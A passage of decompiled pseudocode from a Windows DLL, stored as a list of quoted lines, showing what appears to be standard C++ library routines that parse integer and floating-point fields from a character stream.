    "  if ( !(unsigned __int8)sub_18000E050(a2, a3) )",
    "  {",
    "    if ( !*((_BYTE *)a2 + 8) )",
    "    {",
    "      v21 = *a2;",
    "      if ( !*a2",
    "        || ((v22 = **(unsigned __int8 ***)(v21 + 56)) == 0 || **(int **)(v21 + 80) <= 0",
    "          ? (v23 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v21 + 48LL))(v21))",
    "          : (v23 = *v22),",
    "            v23 == -1) )",
    "      {",
    "        *a2 = 0;",
    "      }",
    "      else",
    "      {",
    "        *((_BYTE *)a2 + 9) = v23;",
    "      }",
    "      *((_BYTE *)a2 + 8) = 1;",
    "    }",
    "    v24 = *((_BYTE *)a2 + 9);",
    "    if ( v24 == v129[23] )",
    "    {",
    "      *a1 = 43;",
    "      v121 = a1 + 1;",
    "      v25 = *a2;",
    "      if ( !*a2",
    "        || (!**(_QWORD **)(v25 + 56) || (v26 = *(int **)(v25 + 80), *v26 <= 0)",
    "          ? (v29 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v25 + 56LL))(v25))",
    "          : (--*v26, v27 = *(unsigned __int8 ***)(v25 + 56), v28 = *v27, ++*v27, v29 = *v28),",
    "            v29 == -1) )",
    "      {",
    "        *a2 = 0;",
    "        *((_BYTE *)a2 + 8) = 1;",
    "      }",
    "      else",
    "      {",
    "        *((_BYTE *)a2 + 8) = 0;",
    "      }",
    "    }",
    "    else if ( v24 == v129[22] )",
    "    {",
    "      *a1 = 45;",
    "      v121 = a1 + 1;",
    "      v30 = *a2;",
    "      if ( !*a2",
    "        || (!**(_QWORD **)(v30 + 56) || (v31 = *(int **)(v30 + 80), *v31 <= 0)",
    "          ? (v34 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v30 + 56LL))(v30))",
    "          : (--*v31, v32 = *(unsigned __int8 ***)(v30 + 56), v33 = *v32, ++*v32, v34 = *v33),",
    "            v34 == -1) )",
    "      {",
    "        *a2 = 0;",
    "        *((_BYTE *)a2 + 8) = 1;",
    "      }",
    "      else",
    "      {",
    "        *((_BYTE *)a2 + 8) = 0;",
    "      }",
    "    }",
    "  }",
    "  if ( v10 && !(unsigned __int8)sub_18000E050(a2, a3) )",
    "  {",
    "    do",
    "    {",
    "      if ( !*((_BYTE *)a2 + 8) )",
    "      {",
    "        v35 = *a2;",
    "        if ( !*a2",
    "          || ((v36 = **(unsigned __int8 ***)(v35 + 56)) == 0 || **(int **)(v35 + 80) <= 0",
    "            ? (v37 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v35 + 48LL))(v35))",
    "            : (v37 = *v36),",
    "              v37 == -1) )",
    "        {",
    "          *a2 = 0;",
    "        }",
    "        else",
    "        {",
    "          *((_BYTE *)a2 + 9) = v37;",
    "        }",
    "        *((_BYTE *)a2 + 8) = 1;",
    "      }",
    "      if ( *((_BYTE *)a2 + 9) != v10 )",
    "        break;",
    "      v38 = *a2;",
    "      if ( !*a2",
    "        || (!**(_QWORD **)(v38 + 56) || (v39 = *(int **)(v38 + 80), *v39 <= 0)",
    "          ? (v42 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v38 + 56LL))(v38))",
    "          : (--*v39, v40 = *(unsigned __int8 ***)(v38 + 56), v41 = *v40, ++*v40, v42 = *v41),",
    "            v42 == -1) )",
    "      {",
    "        *a2 = 0;",
    "        v43 = 1;",
    "      }",
    "      else",
    "      {",
    "        v43 = 0;",
    "      }",
    "      *((_BYTE *)a2 + 8) = v43;",
    "      v116 = 1;",
    "    }",
    "    while ( !(unsigned __int8)sub_18000E050(a2, a3) );",
    "  }",
    "  v44 = a4 & 0xE00;",
    "  if ( v44 == 1024 )",
    "  {",
    "    v45 = 8;",
    "  }",
    "  else if ( v44 == 2048 )",
    "  {",
    "    v45 = 16;",
    "  }",
    "  else",
    "  {",
    "    v45 = v44 != 0 ? 0xA : 0;",
    "  }",
    "  v117 = v45;",
    "  v46 = 0;",
    "  v118 = 0;",
    "  v120 = 0;",
    "  if ( (unsigned __int8)sub_18000E050(a2, a3) )",
    "    goto LABEL_126;",
    "  if ( !*((_BYTE *)a2 + 8) )",
    "  {",
    "    v47 = *a2;",
    "    if ( !*a2",
    "      || ((v48 = **(unsigned __int8 ***)(v47 + 56)) == 0 || **(int **)(v47 + 80) <= 0",
    "        ? (v49 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v47 + 48LL))(v47))",
    "        : (v49 = *v48),",
    "          v49 == -1) )",
    "    {",
    "      *a2 = 0;",
    "    }",
    "    else",
    "    {",
    "      *((_BYTE *)a2 + 9) = v49;",
    "    }",
    "    *((_BYTE *)a2 + 8) = 1;",
    "  }",
    "  if ( *((_BYTE *)a2 + 9) != v129[0] )",
    "  {",
    "LABEL_126:",
    "    if ( !v45 )",
    "      goto LABEL_131;",
    "    goto LABEL_127;",
    "  }",
    "  v46 = 1;",
    "  v118 = 1;",
    "  v50 = *a2;",
    "  if ( !*a2",
    "    || (!**(_QWORD **)(v50 + 56) || (v51 = *(int **)(v50 + 80), *v51 <= 0)",
    "      ? (v54 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v50 + 56LL))(v50))",
    "      : (--*v51, v52 = *(unsigned __int8 ***)(v50 + 56), v53 = *v52, ++*v52, v54 = *v53),",
    "        v54 == -1) )",
    "  {",
    "    *a2 = 0;",
    "    v55 = 1;",
    "  }",
    "  else",
    "  {",
    "    v55 = 0;",
    "  }",
    "  *((_BYTE *)a2 + 8) = v55;",
    "  if ( (unsigned __int8)sub_18000E050(a2, a3) )",
    "    goto LABEL_124;",
    "  if ( !*((_BYTE *)a2 + 8) )",
    "  {",
    "    v56 = *a2;",
    "    if ( !*a2",
    "      || ((v57 = **(unsigned __int8 ***)(v56 + 56)) == 0 || **(int **)(v56 + 80) <= 0",
    "        ? (v58 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v56 + 48LL))(v56))",
    "        : (v58 = *v57),",
    "          v58 == -1) )",
    "    {",
    "      *a2 = 0;",
    "    }",
    "    else",
    "    {",
    "      *((_BYTE *)a2 + 9) = v58;",
    "    }",
    "    *((_BYTE *)a2 + 8) = 1;",
    "  }",
    "  v59 = *((_BYTE *)a2 + 9);",
    "  if ( v59 != v129[25] && v59 != v129[24] )",
    "  {",
    "LABEL_124:",
    "    if ( !v45 )",
    "    {",
    "      v45 = 8;",
    "      v117 = 8;",
    "      goto LABEL_128;",
    "    }",
    "LABEL_127:",
    "    if ( v45 != 10 )",
    "      goto LABEL_128;",
    "LABEL_131:",
    "    v65 = 10;",
    "    goto LABEL_132;",
    "  }",
    "  if ( (v45 & 0xEF) != 0 )",
    "    goto LABEL_127;",
    "  v45 = 16;",
    "  v117 = 16;",
    "  v46 = 0;",
    "  v118 = 0;",
    "  v60 = *a2;",
    "  if ( !*a2",
    "    || (!**(_QWORD **)(v60 + 56) || (v61 = *(int **)(v60 + 80), *v61 <= 0)",
    "      ? (v64 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v60 + 56LL))(v60))",
    "      : (--*v61, v62 = *(unsigned __int8 ***)(v60 + 56), v63 = *v62, ++*v62, v64 = *v63),",
    "        v64 == -1) )",
    "  {",
    "    *a2 = 0;",
    "    *((_BYTE *)a2 + 8) = 1;",
    "  }",
    "  else",
    "  {",
    "    *((_BYTE *)a2 + 8) = 0;",
    "  }",
    "LABEL_128:",
    "  v65 = 22;",
    "  if ( v45 == 8 )",
    "    v65 = 8;",
    "LABEL_132:",
    "  sub_180006C20((__int64)v123, 1u, v46);",
    "  v66 = 0;",
    "  v67 = a1 + 31;",
    "  v68 = sub_18000E050(a2, v122);",
    "  v69 = v125;",
    "  v70 = v123[0];",
    "  if ( v68 )",
    "    goto LABEL_191;",
    "  do",
    "  {",
    "    if ( !*((_BYTE *)a2 + 8) )",
    "    {",
    "      v71 = *a2;",
    "      if ( !*a2",
    "        || ((v72 = **(unsigned __int8 ***)(v71 + 56)) == 0 || **(int **)(v71 + 80) <= 0",
    "          ? (v73 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v71 + 48LL))(v71))",
    "          : (v73 = *v72),",
    "            v73 == -1) )",
    "      {",
    "        *a2 = 0;",
    "      }",
    "      else",
    "      {",
    "        *((_BYTE *)a2 + 9) = v73;",
    "      }",
    "      *((_BYTE *)a2 + 8) = 1;",
    "    }",
    "    v74 = sub_180011120(v129, v130, *((unsigned __int8 *)a2 + 9)) - (_QWORD)v129;",
    "    if ( v74 < v65 )",
    "    {",
    "      v75 = a0123456789abcd[v74];",
    "      *v121 = v75;",
    "      if ( (v120 || v75 != 48) && v121 < v67 )",
    "      {",
    "        ++v121;",
    "        v120 = 1;",
    "      }",
    "      v118 = 1;",
    "      v76 = v123;",
    "      if ( v69 > 0xF )",
    "        v76 = (unsigned __int64 *)v70;",
    "      if ( *((_BYTE *)v76 + v66) == 127 )",
    "        goto LABEL_177;",
    "      v77 = v123;",
    "      if ( v69 > 0xF )",
    "        v77 = (unsigned __int64 *)v70;",
    "      ++*((_BYTE *)v77 + v66);",
    "      goto LABEL_176;",
    "    }",
    "    if ( !v119 )",
    "      break;",
    "    if ( !*((_BYTE *)a2 + 8) )",
    "    {",
    "      v78 = *a2;",
    "      if ( !*a2",
    "        || ((v79 = **(unsigned __int8 ***)(v78 + 56)) == 0 || **(int **)(v78 + 80) <= 0",
    "          ? (v80 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v78 + 48LL))(v78))",
    "          : (v80 = *v79),",
    "            v80 == -1) )",
    "      {",
    "        *a2 = 0;",
    "      }",
    "      else",
    "      {",
    "        *((_BYTE *)a2 + 9) = v80;",
    "      }",
    "      *((_BYTE *)a2 + 8) = 1;",
    "    }",
    "    if ( *((_BYTE *)a2 + 9) != v119 )",
    "      break;",
    "    v81 = v123;",
    "    if ( v69 > 0xF )",
    "      v81 = (unsigned __int64 *)v70;",
    "    if ( !*((_BYTE *)v81 + v66) )",
    "    {",
    "      v116 = 1;",
    "      goto LABEL_177;",
    "    }",
    "    v82 = v124;",
    "    if ( v124 >= v69 )",
    "    {",
    "      sub_18000AD70(v123, 1u, 0, 0);",
    "    }",
    "    else",
    "    {",
    "      ++v124;",
    "      v83 = v123;",
    "      if ( v69 > 0xF )",
    "        v83 = (unsigned __int64 *)v70;",
    "      *(_WORD *)((char *)v83 + v82) = 0;",
    "    }",
    "    ++v66;",
    "LABEL_176:",
    "    v70 = v123[0];",
    "    v69 = v125;",
    "LABEL_177:",
    "    v84 = *a2;",
    "    if ( !*a2",
    "      || (!**(_QWORD **)(v84 + 56) || (v85 = *(int **)(v84 + 80), *v85 <= 0)",
    "        ? (v88 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v84 + 56LL))(v84))",
    "        : (--*v85, v86 = *(unsigned __int8 ***)(v84 + 56), v87 = *v86, ++*v86, v88 = *v87),",
    "          v88 == -1) )",
    "    {",
    "      *a2 = 0;",
    "      v89 = 1;",
    "    }",
    "    else",
    "    {",
    "      v89 = 0;",
    "    }",
    "    *((_BYTE *)a2 + 8) = v89;",
    "  }",
    "  while ( !(unsigned __int8)sub_18000E050(a2, v122) );",
    "  v45 = v117;",
    "  if ( !v66 )",
    "    goto LABEL_191;",
    "  v90 = v123;",
    "  if ( v69 > 0xF )",
    "    v90 = (unsigned __int64 *)v70;",
    "  if ( *((char *)v90 + v66) <= 0 )",
    "  {",
    "    v91 = 1;",
    "  }",
    "  else",
    "  {",
    "    ++v66;",
    "LABEL_191:",
    "    v91 = v116;",
    "  }",
    "  if ( v119 && !(unsigned __int8)sub_18000E050(a2, v122) )",
    "  {",
    "    v92 = v122;",
    "    do",
    "    {",
    "      if ( !*((_BYTE *)a2 + 8) )",
    "      {",
    "        v93 = *a2;",
    "        if ( !*a2",
    "          || ((v94 = **(unsigned __int8 ***)(v93 + 56)) == 0 || **(int **)(v93 + 80) <= 0",
    "            ? (v95 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v93 + 48LL))(v93))",
    "            : (v95 = *v94),",
    "              v95 == -1) )",
    "        {",
    "          *a2 = 0;",
    "        }",
    "        else",
    "        {",
    "          *((_BYTE *)a2 + 9) = v95;",
    "        }",
    "        *((_BYTE *)a2 + 8) = 1;",
    "      }",
    "      if ( *((_BYTE *)a2 + 9) != v119 )",
    "        break;",
    "      v96 = *a2;",
    "      if ( !*a2",
    "        || (!**(_QWORD **)(v96 + 56) || (v97 = *(int **)(v96 + 80), *v97 <= 0)",
    "          ? (v100 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v96 + 56LL))(v96))",
    "          : (--*v97, v98 = *(unsigned __int8 ***)(v96 + 56), v99 = *v98, ++*v98, v100 = *v99),",
    "            v100 == -1) )",
    "      {",
    "        *a2 = 0;",
    "        v101 = 1;",
    "      }",
    "      else",
    "      {",
    "        v101 = 0;",
    "      }",
    "      *((_BYTE *)a2 + 8) = v101;",
    "      v91 = 1;",
    "    }",
    "    while ( !(unsigned __int8)sub_18000E050(a2, v92) );",
    "    v45 = v117;",
    "  }",
    "  v102 = (char *)v126;",
    "  v103 = v126[0];",
    "  v104 = v128;",
    "  if ( v128 > 0xF )",
    "    v102 = (char *)v126[0];",
    "  v105 = &v102[v127];",
    "  v106 = 0;",
    "  if ( !v118 )",
    "  {",
    "    v110 = (unsigned __int8)~v45;",
    "    goto LABEL_238;",
    "  }",
    "  while ( !v91 && v66 )",
    "  {",
    "    if ( v102 != v105 )",
    "      v106 = *v102++;",
    "    --v66;",
    "    if ( (unsigned __int8)(v106 - 1) <= 0x7Du )",
    "    {",
    "      if ( v66 )",
    "      {",
    "        v107 = v123;",
    "        if ( v69 > 0xF )",
    "          v107 = (unsigned __int64 *)v70;",
    "        if ( *((_BYTE *)v107 + v66) != v106 )",
    "          goto LABEL_233;",
    "      }",
    "      else",
    "      {",
    "        v108 = v123;",
    "        if ( v69 > 0xF )",
    "          v108 = (unsigned __int64 *)v70;",
    "        if ( *(char *)v108 > v106 )",
    "        {",
    "LABEL_233:",
    "          v91 = 1;",
    "          continue;",
    "        }",
    "      }",
    "    }",
    "  }",
    "  v109 = v121;",
    "  if ( !v120 )",
    "  {",
    "    *v121 = 48;",
    "    v109 = v121 + 1;",
    "  }",
    "  *v109 = 0;",
    "  v110 = v45 | (v91 << 8);",
    "LABEL_238:",
    "  if ( v69 > 0xF )",
    "  {",
    "    v111 = v69 + 1;",
    "    v112 = v70;",
    "    if ( v69 + 1 >= 0x1000 )",
    "    {",
    "      v111 = v69 + 40;",
    "      v70 = *(_QWORD *)(v70 - 8);",
    "      if ( v112 - v70 - 8 > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v70, v111);",
    "    v104 = v128;",
    "    v103 = v126[0];",
    "  }",
    "  if ( v104 > 0xF )",
    "  {",
    "    v113 = v104 + 1;",
    "    v114 = v103;",
    "    if ( v104 + 1 >= 0x1000 )",
    "    {",
    "      v113 = v104 + 40;",
    "      v103 = *(_QWORD *)(v103 - 8);",
    "      if ( (unsigned __int64)(v114 - v103 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v103, v113);",
    "  }",
    "  return v110;",
    "}",
    "",
    "",
    "char __fastcall sub_18000E050(__int64 *a1, __int64 *a2)",
    "{",
    "  __int64 v4; // rcx",
    "  unsigned __int8 *v5; // rdx",
    "  int v6; // eax",
    "  __int64 v7; // rcx",
    "  unsigned __int8 *v8; // rdx",
    "  int v9; // eax",
    "  __int64 v10; // rax",
    "",
    "  if ( !*((_BYTE *)a1 + 8) )",
    "  {",
    "    v4 = *a1;",
    "    if ( !v4",
    "      || ((v5 = **(unsigned __int8 ***)(v4 + 56)) == 0 || **(int **)(v4 + 80) <= 0",
    "        ? (v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 48LL))(v4))",
    "        : (v6 = *v5),",
    "          v6 == -1) )",
    "    {",
    "      *a1 = 0;",
    "    }",
    "    else",
    "    {",
    "      *((_BYTE *)a1 + 9) = v6;",
    "    }",
    "    *((_BYTE *)a1 + 8) = 1;",
    "  }",
    "  if ( !*((_BYTE *)a2 + 8) )",
    "  {",
    "    v7 = *a2;",
    "    if ( !*a2",
    "      || ((v8 = **(unsigned __int8 ***)(v7 + 56)) == 0 || **(int **)(v7 + 80) <= 0",
    "        ? (v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 48LL))(v7))",
    "        : (v9 = *v8),",
    "          v9 == -1) )",
    "    {",
    "      *a2 = 0;",
    "    }",
    "    else",
    "    {",
    "      *((_BYTE *)a2 + 9) = v9;",
    "    }",
    "    *((_BYTE *)a2 + 8) = 1;",
    "  }",
    "  v10 = *a2;",
    "  if ( *a1 )",
    "  {",
    "    if ( !v10 )",
    "      return 0;",
    "  }",
    "  else if ( v10 )",
    "  {",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000E120(_BYTE *a1, int a2, __int64 a3, __int64 *a4, __int64 a5)",
    "{",
    "  unsigned __int16 v8; // r12",
    "  __int64 v9; // rax",
    "  __int64 v10; // r14",
    "  char v11; // r15",
    "  __int64 v12; // rcx",
    "  unsigned __int8 *v13; // rdx",
    "  int v14; // eax",
    "  __int64 v15; // rcx",
    "  int *v16; // rdx",
    "  unsigned __int8 **v17; // rcx",
    "  unsigned __int8 *v18; // rdx",
    "  int v19; // eax",
    "  char v20; // al",
    "  __int64 v21; // rcx",
    "  unsigned __int8 *v22; // rdx",
    "  int v23; // eax",
    "  char v24; // al",
    "  __int64 v25; // rcx",
    "  int *v26; // rdx",
    "  unsigned __int8 **v27; // rcx",
    "  unsigned __int8 *v28; // rdx",
    "  int v29; // eax",
    "  __int64 v30; // rcx",
    "  int *v31; // rdx",
    "  unsigned __int8 **v32; // rcx",
    "  unsigned __int8 *v33; // rdx",
    "  int v34; // eax",
    "  unsigned __int8 *v35; // rsi",
    "  char v36; // di",
    "  __int64 v37; // rcx",
    "  unsigned __int8 *v38; // rdx",
    "  int v39; // eax",
    "  __int64 v40; // rcx",
    "  int *v41; // rdx",
    "  unsigned __int8 **v42; // rcx",
    "  unsigned __int8 *v43; // rdx",
    "  int v44; // eax",
    "  char v45; // al",
    "  unsigned __int16 v46; // bx",
    "  unsigned __int64 v47; // rdx",
    "  __int64 v48; // rcx",
    "  __int64 v50; // rcx",
    "  unsigned __int8 *v51; // rdx",
    "  int v52; // eax",
    "  char v53; // al",
    "  __int64 v54; // rcx",
    "  int *v55; // rdx",
    "  unsigned __int8 **v56; // rcx",
    "  unsigned __int8 *v57; // rdx",
    "  int v58; // eax",
    "  char v59; // al",
    "  int v60; // r13d",
    "  __int64 v61; // rax",
    "  __int64 *v62; // rdi",
    "  unsigned __int64 i; // r15",
    "  __int64 v64; // rcx",
    "  unsigned __int8 *v65; // rdx",
    "  int v66; // eax",
    "  unsigned __int64 v67; // rax",
    "  __int64 v68; // rcx",
    "  int *v69; // rdx",
    "  unsigned __int8 **v70; // rcx",
    "  unsigned __int8 *v71; // rdx",
    "  int v72; // eax",
    "  char v73; // al",
    "  __int64 v74; // rcx",
    "  unsigned __int8 *v75; // rdx",
    "  int v76; // eax",
    "  __int64 v77; // rcx",
    "  int *v78; // rdx",
    "  unsigned __int8 **v79; // rcx",
    "  unsigned __int8 *v80; // rdx",
    "  int v81; // eax",
    "  char v82; // al",
    "  __int64 v83; // rdi",
    "  char v84; // al",
    "  unsigned __int64 v85; // rsi",
    "  unsigned __int64 v86; // r14",
    "  __int64 v87; // rcx",
    "  unsigned __int8 *v88; // rdx",
    "  int v89; // eax",
    "  unsigned __int64 v90; // rax",
    "  unsigned __int64 *v91; // rax",
    "  unsigned __int64 *v92; // rax",
    "  __int64 v93; // rcx",
    "  unsigned __int8 *v94; // rdx",
    "  int v95; // eax",
    "  unsigned __int64 *v96; // rax",
    "  unsigned __int64 v97; // rcx",
    "  unsigned __int64 *v98; // rax",
    "  __int64 v99; // rcx",
    "  int *v100; // rdx",
    "  unsigned __int8 **v101; // rcx",
    "  unsigned __int8 *v102; // rdx",
    "  int v103; // eax",
    "  char v104; // al",
    "  unsigned __int64 *v105; // rax",
    "  __int64 v106; // rcx",
    "  unsigned __int8 *v107; // rdx",
    "  int v108; // eax",
    "  __int64 v109; // rcx",
    "  int *v110; // rdx",
    "  unsigned __int8 **v111; // rcx",
    "  unsigned __int8 *v112; // rdx",
    "  int v113; // eax",
    "  char v114; // al",
    "  char *v115; // rcx",
    "  char *v116; // r8",
    "  char v117; // dl",
    "  char *v118; // rax",
    "  unsigned __int64 *v119; // rax",
    "  unsigned __int64 *v120; // rax",
    "  unsigned __int64 v121; // rdx",
    "  unsigned __int64 v122; // rax",
    "  unsigned __int8 v123; // si",
    "  __int64 v124; // rcx",
    "  unsigned __int8 *v125; // rdx",
    "  int v126; // eax",
    "  char v127; // di",
    "  bool v128; // zf",
    "  unsigned __int8 *v129; // rdi",
    "  __int64 v130; // rcx",
    "  int *v131; // rdx",
    "  unsigned __int8 **v132; // rcx",
    "  unsigned __int8 *v133; // rdx",
    "  int v134; // eax",
    "  __int64 v135; // r15",
    "  __int64 v136; // rcx",
    "  unsigned __int8 *v137; // rdx",
    "  int v138; // eax",
    "  __int64 v139; // rcx",
    "  int *v140; // rdx",
    "  unsigned __int8 **v141; // rcx",
    "  unsigned __int8 *v142; // rdx",
    "  int v143; // eax",
    "  char v144; // al",
    "  char v145; // si",
    "  __int64 v146; // rcx",
    "  unsigned __int8 *v147; // rdx",
    "  int v148; // eax",
    "  unsigned __int64 v149; // rax",
    "  __int64 v150; // rcx",
    "  int *v151; // rdx",
    "  unsigned __int8 **v152; // rcx",
    "  unsigned __int8 *v153; // rdx",
    "  int v154; // eax",
    "  char v155; // al",
    "  char *v156; // r13",
    "  char *v157; // rdx",
    "  char v158; // cl",
    "  char v159; // al",
    "  __int64 v160; // rax",
    "  char v161; // si",
    "  __int64 v162; // rax",
    "  char v163; // r14",
    "  char v164; // r15",
    "  __int64 v165; // rdi",
    "  __int64 v166; // rcx",
    "  unsigned __int8 *v167; // rdx",
    "  int v168; // eax",
    "  char v169; // al",
    "  __int64 v170; // rcx",
    "  int *v171; // rdx",
    "  unsigned __int8 **v172; // rcx",
    "  unsigned __int8 *v173; // rdx",
    "  int v174; // eax",
    "  char v175; // al",
    "  char v176; // si",
    "  __int64 v177; // rcx",
    "  unsigned __int8 *v178; // rdx",
    "  int v179; // eax",
    "  char v180; // al",
    "  __int64 v181; // rcx",
    "  int *v182; // rdx",
    "  unsigned __int8 **v183; // rcx",
    "  unsigned __int8 *v184; // rdx",
    "  int v185; // eax",
    "  __int64 v186; // rcx",
    "  int *v187; // rdx",
    "  unsigned __int8 **v188; // rcx",
    "  unsigned __int8 *v189; // rdx",
    "  int v190; // eax",
    "  __int64 v191; // rcx",
    "  unsigned __int8 *v192; // rdx",
    "  int v193; // eax",
    "  __int64 v194; // rcx",
    "  int *v195; // rdx",
    "  unsigned __int8 **v196; // rcx",
    "  unsigned __int8 *v197; // rdx",
    "  int v198; // eax",
    "  char v199; // al",
    "  __int64 v200; // rcx",
    "  unsigned __int8 *v201; // rdx",
    "  int v202; // eax",
    "  __int64 v203; // rcx",
    "  __int64 v204; // rcx",
    "  int *v205; // rdx",
    "  unsigned __int8 **v206; // rcx",
    "  unsigned __int8 *v207; // rdx",
    "  int v208; // eax",
    "  char v209; // al",
    "  __int64 v210; // rax",
    "  __int64 v211; // r9",
    "  __int64 v212; // r10",
    "  __int64 v213; // r8",
    "  bool v214; // cc",
    "  __int64 v215; // rcx",
    "  __int64 v216; // rax",
    "  __int64 v217; // rax",
    "  __int64 v218; // rax",
    "  __int64 v219; // rdi",
    "  __int64 v220; // rax",
    "  char v221; // al",
    "  char *v222; // rcx",
    "  __int64 v223; // r9",
    "  __int16 v224; // bx",
    "  unsigned __int8 v225; // [rsp+20h] [rbp-91h]",
    "  char v226; // [rsp+21h] [rbp-90h]",
    "  char v227; // [rsp+22h] [rbp-8Fh]",
    "  unsigned __int8 v228; // [rsp+23h] [rbp-8Eh]",
    "  char v229; // [rsp+23h] [rbp-8Eh]",
    "  char v230; // [rsp+24h] [rbp-8Dh]",
    "  char v231; // [rsp+25h] [rbp-8Ch]",
    "  char v232; // [rsp+26h] [rbp-8Bh]",
    "  unsigned __int8 *v233; // [rsp+28h] [rbp-89h]",
    "  char v235; // [rsp+38h] [rbp-79h]",
    "  int v237; // [rsp+40h] [rbp-71h]",
    "  __int64 v238; // [rsp+48h] [rbp-69h]",
    "  unsigned __int64 v239; // [rsp+50h] [rbp-61h]",
    "  __int64 v240; // [rsp+58h] [rbp-59h]",
    "  unsigned __int64 v241[2]; // [rsp+60h] [rbp-51h] BYREF",
    "  unsigned __int64 v242; // [rsp+70h] [rbp-41h]",
    "  unsigned __int64 v243; // [rsp+78h] [rbp-39h]",
    "  _QWORD v244[2]; // [rsp+80h] [rbp-31h] BYREF",
    "  __int64 v245; // [rsp+90h] [rbp-21h]",
    "  unsigned __int64 v246; // [rsp+98h] [rbp-19h]",
    "  _BYTE v247[28]; // [rsp+A0h] [rbp-11h] BYREF",
    "  _BYTE v248[4]; // [rsp+BCh] [rbp+Bh] BYREF",
    "",
    "  v8 = 0;",
    "  v9 = sub_180009900(a5);",
    "  (*(void (__fastcall **)(__int64, const char *, void *, _BYTE *))(*(_QWORD *)v9 + 56LL))(",
    "    v9,",
    "    \"0123456789ABCDEFabcdef-+XxPp\",",
    "    &unk_180044A45,",
    "    v247);",
    "  v231 = v247[23];",
    "  v232 = v247[22];",
    "  v230 = v247[0];",
    "  v10 = sub_18000ABA0(a5);",
    "  v240 = v10;",
    "  (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v10 + 40LL))(v10, v244);",
    "  if ( v245 )",
    "  {",
    "    v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v10 + 32LL))(v10);",
    "    v225 = 0;",
    "    if ( v245 && !sub_18000E050((__int64 *)a3, a4) )",
    "    {",
    "      do",
    "      {",
    "        if ( !*(_BYTE *)(a3 + 8) )",
    "        {",
    "          v12 = *(_QWORD *)a3;",
    "          if ( !*(_QWORD *)a3",
    "            || ((v13 = **(unsigned __int8 ***)(v12 + 56)) == 0 || **(int **)(v12 + 80) <= 0",
    "              ? (v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v12 + 48LL))(v12))",
    "              : (v14 = *v13),",
    "                v14 == -1) )",
    "          {",
    "            *(_QWORD *)a3 = 0;",
    "          }",
    "          else",
    "          {",
    "            *(_BYTE *)(a3 + 9) = v14;",
    "          }",
    "          *(_BYTE *)(a3 + 8) = 1;",
    "        }",
    "        if ( *(_BYTE *)(a3 + 9) != v11 )",
    "          break;",
    "        v15 = *(_QWORD *)a3;",
    "        if ( !*(_QWORD *)a3",
    "          || (!**(_QWORD **)(v15 + 56) || (v16 = *(int **)(v15 + 80), *v16 <= 0)",
    "            ? (v19 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v15 + 56LL))(v15))",
    "            : (--*v16, v17 = *(unsigned __int8 ***)(v15 + 56), v18 = *v17, ++*v17, v19 = *v18),",
    "              v19 == -1) )",
    "        {",
    "          *(_QWORD *)a3 = 0;",
    "          v20 = 1;",
    "        }",
    "        else",
    "        {",
    "          v20 = 0;",
    "        }",
    "        *(_BYTE *)(a3 + 8) = v20;",
    "        v225 = 1;",
    "      }",
    "      while ( !sub_18000E050((__int64 *)a3, a4) );",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v11 = 0;",
    "    v225 = 0;",
    "  }",
    "  if ( !sub_18000E050((__int64 *)a3, a4) )",
    "  {",
    "    if ( !*(_BYTE *)(a3 + 8) )",
    "    {",
    "      v21 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || ((v22 = **(unsigned __int8 ***)(v21 + 56)) == 0 || **(int **)(v21 + 80) <= 0",
    "          ? (v23 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v21 + 48LL))(v21))",
    "          : (v23 = *v22),",
    "            v23 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(a3 + 9) = v23;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = 1;",
    "    }",
    "    v24 = *(_BYTE *)(a3 + 9);",
    "    if ( v24 == v231 )",
    "    {",
    "      *a1++ = 43;",
    "      v25 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v25 + 56) || (v26 = *(int **)(v25 + 80), *v26 <= 0)",
    "          ? (v29 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v25 + 56LL))(v25))",
    "          : (--*v26, v27 = *(unsigned __int8 ***)(v25 + 56), v28 = *v27, ++*v27, v29 = *v28),",
    "            v29 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(a3 + 8) = 0;",
    "      }",
    "    }",
    "    else if ( v24 == v232 )",
    "    {",
    "      *a1++ = 45;",
    "      v30 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v30 + 56) || (v31 = *(int **)(v30 + 80), *v31 <= 0)",
    "          ? (v34 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v30 + 56LL))(v30))",
    "          : (--*v31, v32 = *(unsigned __int8 ***)(v30 + 56), v33 = *v32, ++*v32, v34 = *v33),",
    "            v34 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
